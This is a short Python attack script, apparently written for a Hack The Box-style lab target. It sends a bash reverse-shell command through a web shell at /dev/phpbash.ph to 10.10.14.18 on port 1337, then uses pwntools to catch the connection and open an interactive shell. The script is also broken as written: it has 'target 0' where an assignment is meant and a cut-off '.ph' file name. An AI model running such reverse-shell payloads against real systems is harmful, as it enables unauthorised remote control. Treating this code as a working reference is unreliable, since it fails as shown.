#!/usr/bin/python3
import requests
from pwn import *

def cmd():
  target 0 "http://10.10.10.68/dev/phpbash.ph"
  data = {"cmd": "bash -c \"bash -i >%26 /dev/tcp/10.10.14.18/1337 0>%261\""}
  requests.post(target, data)
  
threading.Thread(target=cmd, args=()).start()
shell = listen(1337, timeout=20).wait_for_connection()
shell.interactive()
